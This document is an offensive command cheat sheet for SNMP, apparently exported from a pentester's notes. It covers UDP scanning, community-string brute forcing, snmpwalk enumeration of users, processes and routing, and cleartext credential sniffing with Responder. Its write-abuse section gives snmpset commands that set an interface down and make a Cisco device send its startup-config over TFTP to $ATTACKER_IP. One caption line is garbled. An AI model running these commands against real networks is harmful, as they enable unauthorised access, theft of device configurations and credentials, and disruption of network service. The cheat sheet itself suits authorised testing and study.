---
id: "tmfhl8w9ompsiw5ep"
title: "snmp"
description: ""
tags: []
order: "8"
createdAt: "2026-05-30T15:45:54.529Z"
updatedAt: "2026-05-30T15:46:06.271Z"
---

## Port Discovery & Scanning
<!-- section: {"id":"jgp8uu67zmpsiwe62","order":0,"collapsed":false} -->

### d1hdr34pjmpsiwe7v
```bash
nmap -sU -p 161,162 $TARGET
```

_Port Discovery & Scanning_

**Tags:** snmp, nmap, rustscan, recon, discovery, udp
<!-- cmd: {"id":"d1hdr34pjmpsiwe7v","language":"bash","sectionId":"jgp8uu67zmpsiwe62","tags":["snmp","nmap","rustscan","recon","discovery","udp"]} -->

### 0xug0wkz1mpsiwe80
```bash
nmap -sU -p 161 --script snmp-info,snmp-brute,snmp-communities,snmp-interfaces,snmp-netstat,snmp-processes,snmp-sysdescr $TARGET
```

**Tags:** snmp, nmap, rustscan, recon, discovery, udp
<!-- cmd: {"id":"0xug0wkz1mpsiwe80","language":"bash","sectionId":"jgp8uu67zmpsiwe62","tags":["snmp","nmap","rustscan","recon","discovery","udp"]} -->

### mr51ak9unmpsiwe84
```bash
rustscan -a $TARGET -- -sU -p 161,162 -sV
```

**Tags:** snmp, nmap, rustscan, recon, discovery, udp
<!-- cmd: {"id":"mr51ak9unmpsiwe84","language":"bash","sectionId":"jgp8uu67zmpsiwe62","tags":["snmp","nmap","rustscan","recon","discovery","udp"]} -->

## Community String Brute Force
<!-- section: {"id":"r9zdozdk7mpsiwe6a","order":1,"collapsed":false} -->

### uquuj1q46mpsiwe8g
```bash
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt $TARGET
```

_Community String Brute Force_

**Tags:** snmp, community-string, bruteforce, onesixtyone, unauthenticated
<!-- cmd: {"id":"uquuj1q46mpsiwe8g","language":"bash","sectionId":"r9zdozdk7mpsiwe6a","tags":["snmp","community-string","bruteforce","onesixtyone","unauthenticated"]} -->

### vdvuksd6ompsiwe8j
```bash
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt -i hosts.txt
```

**Tags:** snmp, community-string, bruteforce, onesixtyone, unauthenticated
<!-- cmd: {"id":"vdvuksd6ompsiwe8j","language":"bash","sectionId":"r9zdozdk7mpsiwe6a","tags":["snmp","community-string","bruteforce","onesixtyone","unauthenticated"]} -->

### 8x60nebzbmpsiwe8o
```bash
hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt $TARGET snmp
```

**Tags:** snmp, community-string, bruteforce, onesixtyone, unauthenticated
<!-- cmd: {"id":"8x60nebzbmpsiwe8o","language":"bash","sectionId":"r9zdozdk7mpsiwe6a","tags":["snmp","community-string","bruteforce","onesixtyone","unauthenticated"]} -->

### ervuzbrlnmpsiwe8s
```bash
use auxiliary/scanner/snmp/snmp_login
```

**Tags:** snmp, community-string, bruteforce, onesixtyone, unauthenticated
<!-- cmd: {"id":"ervuzbrlnmpsiwe8s","language":"bash","sectionId":"r9zdozdk7mpsiwe6a","tags":["snmp","community-string","bruteforce","onesixtyone","unauthenticated"]} -->

### yci04fdqrmpsiwe8w
```bash
set RHOSTS $TARGET
```

**Tags:** snmp, community-string, bruteforce, onesixtyone, unauthenticated
<!-- cmd: {"id":"yci04fdqrmpsiwe8w","language":"bash","sectionId":"r9zdozdk7mpsiwe6a","tags":["snmp","community-string","bruteforce","onesixtyone","unauthenticated"]} -->

### 3eu2hkxhympsiwe8z
```bash
set PASS_FILE /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt
```

**Tags:** snmp, community-string, bruteforce, onesixtyone, unauthenticated
<!-- cmd: {"id":"3eu2hkxhympsiwe8z","language":"bash","sectionId":"r9zdozdk7mpsiwe6a","tags":["snmp","community-string","bruteforce","onesixtyone","unauthenticated"]} -->

### ldi6aueqompsiwe93
```bash
run
```

**Tags:** snmp, community-string, bruteforce, onesixtyone, unauthenticated
<!-- cmd: {"id":"ldi6aueqompsiwe93","language":"bash","sectionId":"r9zdozdk7mpsiwe6a","tags":["snmp","community-string","bruteforce","onesixtyone","unauthenticated"]} -->

### 6wp9ggt4pmpsiwe97
```bash
nmap -sU -p 161 --script snmp-brute $TARGET
```

**Tags:** snmp, community-string, bruteforce, onesixtyone, unauthenticated
<!-- cmd: {"id":"6wp9ggt4pmpsiwe97","language":"bash","sectionId":"r9zdozdk7mpsiwe6a","tags":["snmp","community-string","bruteforce","onesixtyone","unauthenticated"]} -->

## SNMP v1/v2c Enumeration (public/private)
<!-- section: {"id":"2vm9j17ixmpsiwe6e","order":2,"collapsed":false} -->

### 4fdzqka5fmpsiwe9m
```bash
snmpwalk -v2c -c public $TARGET
```

_SNMP v1/v2c Enumeration (public/private)_

**Tags:** snmp, enumeration, snmpwalk, processes, interfaces, unauthenticated
<!-- cmd: {"id":"4fdzqka5fmpsiwe9m","language":"bash","sectionId":"2vm9j17ixmpsiwe6e","tags":["snmp","enumeration","snmpwalk","processes","interfaces","unauthenticated"]} -->

### 2cn6yi2d2mpsiwe9q
```bash
snmpwalk -v2c -c public $TARGET system
```

**Tags:** snmp, enumeration, snmpwalk, processes, interfaces, unauthenticated
<!-- cmd: {"id":"2cn6yi2d2mpsiwe9q","language":"bash","sectionId":"2vm9j17ixmpsiwe6e","tags":["snmp","enumeration","snmpwalk","processes","interfaces","unauthenticated"]} -->

### zh7lbqlyzmpsiwe9u
```bash
snmpwalk -v2c -c private $TARGET
```

**Tags:** snmp, enumeration, snmpwalk, processes, interfaces, unauthenticated
<!-- cmd: {"id":"zh7lbqlyzmpsiwe9u","language":"bash","sectionId":"2vm9j17ixmpsiwe6e","tags":["snmp","enumeration","snmpwalk","processes","interfaces","unauthenticated"]} -->

### r03hcloaempsiwe9y
```bash
snmpwalk -v2c -c public $TARGET interfaces
```

**Tags:** snmp, enumeration, snmpwalk, processes, interfaces, unauthenticated
<!-- cmd: {"id":"r03hcloaempsiwe9y","language":"bash","sectionId":"2vm9j17ixmpsiwe6e","tags":["snmp","enumeration","snmpwalk","processes","interfaces","unauthenticated"]} -->

### t2yy6ky47mpsiwea2
```bash
snmpwalk -v2c -c public $TARGET 1.3.6.1.2.1.2.2.1.2
```

**Tags:** snmp, enumeration, snmpwalk, processes, interfaces, unauthenticated
<!-- cmd: {"id":"t2yy6ky47mpsiwea2","language":"bash","sectionId":"2vm9j17ixmpsiwe6e","tags":["snmp","enumeration","snmpwalk","processes","interfaces","unauthenticated"]} -->

### 0fe67dxwampsiwea6
```bash
snmpwalk -v2c -c public $TARGET hrSWRunName
```

**Tags:** snmp, enumeration, snmpwalk, processes, interfaces, unauthenticated
<!-- cmd: {"id":"0fe67dxwampsiwea6","language":"bash","sectionId":"2vm9j17ixmpsiwe6e","tags":["snmp","enumeration","snmpwalk","processes","interfaces","unauthenticated"]} -->

### f74kpaujvmpsiweaa
```bash
snmpwalk -v2c -c public $TARGET 1.3.6.1.2.1.25.4.2.1.2
```

**Tags:** snmp, enumeration, snmpwalk, processes, interfaces, unauthenticated
<!-- cmd: {"id":"f74kpaujvmpsiweaa","language":"bash","sectionId":"2vm9j17ixmpsiwe6e","tags":["snmp","enumeration","snmpwalk","processes","interfaces","unauthenticated"]} -->

### uwr8ddtmempsiwead
```bash
snmpwalk -v2c -c public $TARGET 1.3.6.1.2.1.6.13
```

**Tags:** snmp, enumeration, snmpwalk, processes, interfaces, unauthenticated
<!-- cmd: {"id":"uwr8ddtmempsiwead","language":"bash","sectionId":"2vm9j17ixmpsiwe6e","tags":["snmp","enumeration","snmpwalk","processes","interfaces","unauthenticated"]} -->

### ms1gm5omompsiweai
```bash
snmpwalk -v2c -c public $TARGET hrSWInstalledName
```

**Tags:** snmp, enumeration, snmpwalk, processes, interfaces, unauthenticated
<!-- cmd: {"id":"ms1gm5omompsiweai","language":"bash","sectionId":"2vm9j17ixmpsiwe6e","tags":["snmp","enumeration","snmpwalk","processes","interfaces","unauthenticated"]} -->

### nuh7ogvhvmpsiweal
```bash
snmpwalk -v2c -c public $TARGET 1.3.6.1.2.1.6.13.1.3
```

**Tags:** snmp, enumeration, snmpwalk, processes, interfaces, unauthenticated
<!-- cmd: {"id":"nuh7ogvhvmpsiweal","language":"bash","sectionId":"2vm9j17ixmpsiwe6e","tags":["snmp","enumeration","snmpwalk","processes","interfaces","unauthenticated"]} -->

### pp8w6r5v0mpsiweap
```bash
snmpwalk -v2c -c public $TARGET 1.3.6.1.2.1.7.5.1.2
```

**Tags:** snmp, enumeration, snmpwalk, processes, interfaces, unauthenticated
<!-- cmd: {"id":"pp8w6r5v0mpsiweap","language":"bash","sectionId":"2vm9j17ixmpsiwe6e","tags":["snmp","enumeration","snmpwalk","processes","interfaces","unauthenticated"]} -->

## snmp-check — Full Enumeration
<!-- section: {"id":"tpmwkwqbampsiwe6i","order":3,"collapsed":false} -->

### bf8uq1tt1mpsiweb3
```bash
snmp-check $TARGET -c public
```

_snmp-check — Full Enumeration_

**Tags:** snmp, snmp-check, enumeration, unauthenticated
<!-- cmd: {"id":"bf8uq1tt1mpsiweb3","language":"bash","sectionId":"tpmwkwqbampsiwe6i","tags":["snmp","snmp-check","enumeration","unauthenticated"]} -->

### 831542b67mpsiweb7
```bash
snmp-check $TARGET -c public -v 2c
```

**Tags:** snmp, snmp-check, enumeration, unauthenticated
<!-- cmd: {"id":"831542b67mpsiweb7","language":"bash","sectionId":"tpmwkwqbampsiwe6i","tags":["snmp","snmp-check","enumeration","unauthenticated"]} -->

### 0d52hgoh4mpsiwebc
```bash
snmp-check $TARGET -c private -v 2c -d
```

**Tags:** snmp, snmp-check, enumeration, unauthenticated
<!-- cmd: {"id":"0d52hgoh4mpsiwebc","language":"bash","sectionId":"tpmwkwqbampsiwe6i","tags":["snmp","snmp-check","enumeration","unauthenticated"]} -->

## Enumerate Users, Shares, Domain Info
<!-- section: {"id":"2fbyknuz0mpsiwe6m","order":4,"collapsed":false} -->

### 9kfg9o424mpsiwebk
```bash
snmpwalk -v1 -c public $TARGET 1.3.6.1.4.1.77.1.2.25
```

_Enumerate Users, Shares, Domain Info SNMP often leaks Windows usernames and shares._

**Tags:** snmp, windows, users, shares, enumeration, unauthenticated
<!-- cmd: {"id":"9kfg9o424mpsiwebk","language":"bash","sectionId":"2fbyknuz0mpsiwe6m","tags":["snmp","windows","users","shares","enumeration","unauthenticated"]} -->

### efg5ucwskmpsiwebo
```bash
snmpwalk -v1 -c public $TARGET 1.3.6.1.4.1.77.1.2.27
```

**Tags:** snmp, windows, users, shares, enumeration, unauthenticated
<!-- cmd: {"id":"efg5ucwskmpsiwebo","language":"bash","sectionId":"2fbyknuz0mpsiwe6m","tags":["snmp","windows","users","shares","enumeration","unauthenticated"]} -->

### 66fa0zxm6mpsiwebs
```bash
snmpwalk -v1 -c public $TARGET 1.3.6.1.4.1.77.1.2.3.1.1
```

**Tags:** snmp, windows, users, shares, enumeration, unauthenticated
<!-- cmd: {"id":"66fa0zxm6mpsiwebs","language":"bash","sectionId":"2fbyknuz0mpsiwe6m","tags":["snmp","windows","users","shares","enumeration","unauthenticated"]} -->

### isx8stdzvmpsiwebw
```bash
snmpwalk -v2c -c public $TARGET 1.3.6.1.2.1.4.24.4.1.3
```

**Tags:** snmp, windows, users, shares, enumeration, unauthenticated
<!-- cmd: {"id":"isx8stdzvmpsiwebw","language":"bash","sectionId":"2fbyknuz0mpsiwe6m","tags":["snmp","windows","users","shares","enumeration","unauthenticated"]} -->

### v95x4jnwwmpsiwec0
```bash
snmpwalk -v2c -c public $TARGET 1.3.6.1.2.1.4.22.1.2
```

**Tags:** snmp, windows, users, shares, enumeration, unauthenticated
<!-- cmd: {"id":"v95x4jnwwmpsiwec0","language":"bash","sectionId":"2fbyknuz0mpsiwe6m","tags":["snmp","windows","users","shares","enumeration","unauthenticated"]} -->

## SNMPv3 Enumeration
<!-- section: {"id":"k2c6twg46mpsiwe6p","order":5,"collapsed":false} -->

### 351wuzqm0mpsiwec9
```bash
snmpwalk -v3 -l authPriv -u $USER -a SHA -A '$AUTH_PASS' -x AES -X '$PRIV_PASS' $TARGET
```

_PASS' -x AES -X '$PRIV_

**Tags:** snmp, snmpv3, authenticated, enumeration
<!-- cmd: {"id":"351wuzqm0mpsiwec9","language":"bash","sectionId":"k2c6twg46mpsiwe6p","tags":["snmp","snmpv3","authenticated","enumeration"]} -->

### vzvxrxzq2mpsiwecc
```bash
nmap -sU -p 161 --script snmp-brute $TARGET --script-args brute.firstonly
```

**Tags:** snmp, snmpv3, authenticated, enumeration
<!-- cmd: {"id":"vzvxrxzq2mpsiwecc","language":"bash","sectionId":"k2c6twg46mpsiwe6p","tags":["snmp","snmpv3","authenticated","enumeration"]} -->

### 05s45sfzumpsiwecg
```bash
use auxiliary/scanner/snmp/snmp_enumusers
```

**Tags:** snmp, snmpv3, authenticated, enumeration
<!-- cmd: {"id":"05s45sfzumpsiwecg","language":"bash","sectionId":"k2c6twg46mpsiwe6p","tags":["snmp","snmpv3","authenticated","enumeration"]} -->

### yosmnjumrmpsiweck
```bash
set VERSION 3
```

**Tags:** snmp, snmpv3, authenticated, enumeration
<!-- cmd: {"id":"yosmnjumrmpsiweck","language":"bash","sectionId":"k2c6twg46mpsiwe6p","tags":["snmp","snmpv3","authenticated","enumeration"]} -->

### iv548f9eimpsiweco
```bash
set RHOSTS $TARGET
```

**Tags:** snmp, snmpv3, authenticated, enumeration
<!-- cmd: {"id":"iv548f9eimpsiweco","language":"bash","sectionId":"k2c6twg46mpsiwe6p","tags":["snmp","snmpv3","authenticated","enumeration"]} -->

### ce3og7fjbmpsiwecs
```bash
run
```

**Tags:** snmp, snmpv3, authenticated, enumeration
<!-- cmd: {"id":"ce3og7fjbmpsiwecs","language":"bash","sectionId":"k2c6twg46mpsiwe6p","tags":["snmp","snmpv3","authenticated","enumeration"]} -->

## SNMP Write Access Abuse
<!-- section: {"id":"579dq55wbmpsiwe6t","order":6,"collapsed":false} -->

### dlnpm3se4mpsiweda
```bash
snmpset -v2c -c private $TARGET sysName.0 s "pwned"
```

_SNMP Write Access Abuse If community string has write access (e.g., "private"), you can modify configs._

**Tags:** snmp, write-access, misconfiguration, abuse, cisco
<!-- cmd: {"id":"dlnpm3se4mpsiweda","language":"bash","sectionId":"579dq55wbmpsiwe6t","tags":["snmp","write-access","misconfiguration","abuse","cisco"]} -->

### xuhbbp4irmpsiwede
```bash
snmpset -v2c -c private $TARGET 1.3.6.1.2.1.2.2.1.7.1 i 2
```

**Tags:** snmp, write-access, misconfiguration, abuse, cisco
<!-- cmd: {"id":"xuhbbp4irmpsiwede","language":"bash","sectionId":"579dq55wbmpsiwe6t","tags":["snmp","write-access","misconfiguration","abuse","cisco"]} -->

### utfhebfr7mpsiwedi
```bash
snmpset -v2c -c private $TARGET 1.3.6.1.4.1.9.2.1.55.0 s "$ATTACKER_IP"
```

**Tags:** snmp, write-access, misconfiguration, abuse, cisco
<!-- cmd: {"id":"utfhebfr7mpsiwedi","language":"bash","sectionId":"579dq55wbmpsiwe6t","tags":["snmp","write-access","misconfiguration","abuse","cisco"]} -->

### q4cdwgu3kmpsiwedm
```bash
snmpset -v2c -c private $TARGET 1.3.6.1.4.1.9.2.1.56.0 s "copy startup-config tftp"
```

**Tags:** snmp, write-access, misconfiguration, abuse, cisco
<!-- cmd: {"id":"q4cdwgu3kmpsiwedm","language":"bash","sectionId":"579dq55wbmpsiwe6t","tags":["snmp","write-access","misconfiguration","abuse","cisco"]} -->

## SNMP Credential Extraction
<!-- section: {"id":"hbupclcirmpsiwe6x","order":7,"collapsed":false} -->

### b49mg5ev6mpsiwedu
```bash
tcpdump -i eth0 -w snmp.pcap port 161
```

_SNMP Credential Extraction SNMP v1/v2c community strings captured in clear text._

**Tags:** snmp, credential-capture, cleartext, responder
<!-- cmd: {"id":"b49mg5ev6mpsiwedu","language":"bash","sectionId":"hbupclcirmpsiwe6x","tags":["snmp","credential-capture","cleartext","responder"]} -->

### 754nu17c8mpsiwedy
```bash
tshark -i eth0 -Y snmp -T fields -e snmp.community
```

**Tags:** snmp, credential-capture, cleartext, responder
<!-- cmd: {"id":"754nu17c8mpsiwedy","language":"bash","sectionId":"hbupclcirmpsiwe6x","tags":["snmp","credential-capture","cleartext","responder"]} -->

### sf4eza2igmpsiwee3
```bash
responder -I eth0 -rf
```

**Tags:** snmp, credential-capture, cleartext, responder
<!-- cmd: {"id":"sf4eza2igmpsiwee3","language":"bash","sectionId":"hbupclcirmpsiwe6x","tags":["snmp","credential-capture","cleartext","responder"]} -->

## MIB Specific Enumeration
<!-- section: {"id":"cu3vj0xcnmpsiwe71","order":8,"collapsed":false} -->

### m4sfid4y5mpsiweeb
```bash
snmpwalk -v2c -c public -m ALL $TARGET
```

_MIB Specific Enumeration_

**Tags:** snmp, mib, cisco, vendor-specific, enumeration
<!-- cmd: {"id":"m4sfid4y5mpsiweeb","language":"bash","sectionId":"cu3vj0xcnmpsiwe71","tags":["snmp","mib","cisco","vendor-specific","enumeration"]} -->

### b6nspo175mpsiweef
```bash
snmpwalk -v2c -c public -m /usr/share/snmp/mibs/ $TARGET
```

**Tags:** snmp, mib, cisco, vendor-specific, enumeration
<!-- cmd: {"id":"b6nspo175mpsiweef","language":"bash","sectionId":"cu3vj0xcnmpsiwe71","tags":["snmp","mib","cisco","vendor-specific","enumeration"]} -->

### 2wvwg12o7mpsiweej
```bash
snmpwalk -v2c -c public $TARGET 1.3.6.1.4.1.9
```

**Tags:** snmp, mib, cisco, vendor-specific, enumeration
<!-- cmd: {"id":"2wvwg12o7mpsiweej","language":"bash","sectionId":"cu3vj0xcnmpsiwe71","tags":["snmp","mib","cisco","vendor-specific","enumeration"]} -->

### 3uqi77o4kmpsiween
```bash
snmpwalk -v2c -c public $TARGET 1.3.6.1.4.1.2636
```

**Tags:** snmp, mib, cisco, vendor-specific, enumeration
<!-- cmd: {"id":"3uqi77o4kmpsiween","language":"bash","sectionId":"cu3vj0xcnmpsiwe71","tags":["snmp","mib","cisco","vendor-specific","enumeration"]} -->

### 61wfmhw9bmpsiweer
```bash
snmpwalk -v2c -c public $TARGET 1.3.6.1.4.1.11
```

**Tags:** snmp, mib, cisco, vendor-specific, enumeration
<!-- cmd: {"id":"61wfmhw9bmpsiweer","language":"bash","sectionId":"cu3vj0xcnmpsiwe71","tags":["snmp","mib","cisco","vendor-specific","enumeration"]} -->

## Network Topology Discovery
<!-- section: {"id":"v7tgh0jk6mpsiwe74","order":9,"collapsed":false} -->

### 3ktzxvk30mpsiwef0
```bash
snmpwalk -v2c -c public $TARGET 1.3.6.1.4.1.9.9.23.1.2.1.1.6
```

_Network Topology Discovery_

**Tags:** snmp, network-topology, arp, routing, recon
<!-- cmd: {"id":"3ktzxvk30mpsiwef0","language":"bash","sectionId":"v7tgh0jk6mpsiwe74","tags":["snmp","network-topology","arp","routing","recon"]} -->

### jfbas21iompsiwef5
```bash
snmpwalk -v2c -c public $TARGET 1.3.6.1.2.1.4.21
```

**Tags:** snmp, network-topology, arp, routing, recon
<!-- cmd: {"id":"jfbas21iompsiwef5","language":"bash","sectionId":"v7tgh0jk6mpsiwe74","tags":["snmp","network-topology","arp","routing","recon"]} -->

### c1vs4f2q7mpsiwef8
```bash
snmpwalk -v2c -c public $TARGET 1.3.6.1.2.1.4.22.1
```

**Tags:** snmp, network-topology, arp, routing, recon
<!-- cmd: {"id":"c1vs4f2q7mpsiwef8","language":"bash","sectionId":"v7tgh0jk6mpsiwe74","tags":["snmp","network-topology","arp","routing","recon"]} -->

## NSE Scripts — Comprehensive Scan
<!-- section: {"id":"riig9c4w3mpsiwe78","order":10,"collapsed":false} -->

### evfw1irm4mpsiweft
```bash
nmap -sU -p 161 --script "snmp-*" $TARGET
```

_NSE Scripts — Comprehensive Scan_

**Tags:** snmp, nmap, nse, comprehensive
<!-- cmd: {"id":"evfw1irm4mpsiweft","language":"bash","sectionId":"riig9c4w3mpsiwe78","tags":["snmp","nmap","nse","comprehensive"]} -->

### qgk1po0ylmpsiwefx
```bash
nmap -sU -p 161 --script snmp-info,snmp-brute,snmp-communities,snmp-interfaces,snmp-ios-config,snmp-netstat,snmp-processes,snmp-sysdescr,snmp-win32-services,snmp-win32-shares,snmp-win32-software,snmp-win32-users $TARGET
```

**Tags:** snmp, nmap, nse, comprehensive
<!-- cmd: {"id":"qgk1po0ylmpsiwefx","language":"bash","sectionId":"riig9c4w3mpsiwe78","tags":["snmp","nmap","nse","comprehensive"]} -->

## Common Misconfigurations
<!-- section: {"id":"4knco3qp5mpsiwe7c","order":11,"collapsed":false} -->

### ydziba50rmpsiweg7
```bash
onesixtyone $TARGET public
```

_Common Misconfigurations_

**Tags:** snmp, misconfiguration, default-community, v1v2, write-access
<!-- cmd: {"id":"ydziba50rmpsiweg7","language":"bash","sectionId":"4knco3qp5mpsiwe7c","tags":["snmp","misconfiguration","default-community","v1v2","write-access"]} -->

### iifhygflompsiwegb
```bash
onesixtyone $TARGET private
```

**Tags:** snmp, misconfiguration, default-community, v1v2, write-access
<!-- cmd: {"id":"iifhygflompsiwegb","language":"bash","sectionId":"4knco3qp5mpsiwe7c","tags":["snmp","misconfiguration","default-community","v1v2","write-access"]} -->

### 447n9mf90mpsiwegf
```bash
onesixtyone $TARGET community
```

**Tags:** snmp, misconfiguration, default-community, v1v2, write-access
<!-- cmd: {"id":"447n9mf90mpsiwegf","language":"bash","sectionId":"4knco3qp5mpsiwe7c","tags":["snmp","misconfiguration","default-community","v1v2","write-access"]} -->

### irovuz86smpsiwegj
```bash
nmap -sU -p 161 --script snmp-info $TARGET
```

**Tags:** snmp, misconfiguration, default-community, v1v2, write-access
<!-- cmd: {"id":"irovuz86smpsiwegj","language":"bash","sectionId":"4knco3qp5mpsiwe7c","tags":["snmp","misconfiguration","default-community","v1v2","write-access"]} -->

### 8dzo5yoixmpsiwegn
```bash
snmpset -v2c -c private $TARGET sysName.0 s test
```

**Tags:** snmp, misconfiguration, default-community, v1v2, write-access
<!-- cmd: {"id":"8dzo5yoixmpsiwegn","language":"bash","sectionId":"4knco3qp5mpsiwe7c","tags":["snmp","misconfiguration","default-community","v1v2","write-access"]} -->

### t6v5aawimmpsiwegr
```bash
nmap -sU -p 161 $TARGET
```

**Tags:** snmp, misconfiguration, default-community, v1v2, write-access
<!-- cmd: {"id":"t6v5aawimmpsiwegr","language":"bash","sectionId":"4knco3qp5mpsiwe7c","tags":["snmp","misconfiguration","default-community","v1v2","write-access"]} -->

### 98elvhirhmpsiwegv
```bash
snmpget -v2c -c public $TARGET sysDescr.0
```

**Tags:** snmp, misconfiguration, default-community, v1v2, write-access
<!-- cmd: {"id":"98elvhirhmpsiwegv","language":"bash","sectionId":"4knco3qp5mpsiwe7c","tags":["snmp","misconfiguration","default-community","v1v2","write-access"]} -->
